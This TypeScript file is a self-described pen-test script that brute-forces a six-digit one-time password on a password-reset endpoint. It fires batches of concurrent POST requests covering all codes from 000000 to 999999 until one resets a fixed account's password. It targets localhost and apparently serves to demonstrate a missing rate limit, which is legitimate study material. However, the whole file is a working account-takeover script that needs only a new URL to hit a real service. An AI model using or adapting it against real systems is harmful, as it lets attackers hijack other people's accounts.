import axios from "axios";

async function sendRequest(otp: string) {
  const data = {
    "email": "faizan@gmail.com",
    "otp": otp,
    "newPassword": "faizan@1234"
  };

  try {
    const response = await axios.post(
      'http://localhost:3000/reset-password',
      data,
      {
        headers: { 'Content-Type': 'application/json' }
      }
    );
    
    // If we get here, we received a successful response
    console.log(`SUCCESS! OTP ${otp} worked: ${response.data.message}`);
    return { success: true, otp, message: response.data.message };
  } catch (error) {
    // Only log specific errors, not 401 (invalid OTP)
    if (axios.isAxiosError(error) && error.response?.status !== 401) {
      console.error(`Error with OTP ${otp}:`, error.message);
    }
    return { success: false, otp };
  }
}

async function penTest() {
  // Much smaller batch size to prevent memory issues
  const BATCH_SIZE = 100;
  let foundCorrectOTP = false;
  
  // Start from 0 and go up to 999999
  for (let i = 0; i <= 999999 && !foundCorrectOTP; i += BATCH_SIZE) {
    if (i % 1000 === 0) {
      console.log(`Testing OTPs from ${i.toString().padStart(6, '0')} to ${Math.min(i + BATCH_SIZE - 1, 999999).toString().padStart(6, '0')}`);
    }
    
    // Process in smaller batches
    const batch = [];
    for (let j = 0; j < BATCH_SIZE && i + j <= 999999; j++) {
      // Ensure each OTP is exactly 6 digits with leading zeros
      const otpString = (i + j).toString().padStart(6, '0');
      batch.push(sendRequest(otpString));
    }
    
    // Wait for batch to complete and check results
    const results = await Promise.all(batch);
    
    // Check if any request was successful
    const successfulResult = results.find(result => result.success);
    if (successfulResult) {
      foundCorrectOTP = true;
      console.log(`Found correct OTP: ${successfulResult.otp}`);
      break; // Exit the loop
    }
    

  }
  
  if (foundCorrectOTP) {
    console.log("Password reset successful!");
  } else {
    console.log("Failed to find the correct OTP after trying all possibilities (000000-999999).");
  }
  
  return foundCorrectOTP;
}

// Run the test and handle completion

penTest()
  .then(success => {
    if (success) {
      console.log("Test completed successfully - correct OTP found");
    } else {
      console.log("Test completed - no valid OTP found after checking all million combinations");
    }
    process.exit(0); // Ensure the program terminates
  })
  .catch(err => {
    console.error("Test failed with error:", err);
    process.exit(1); // Exit with error code
  });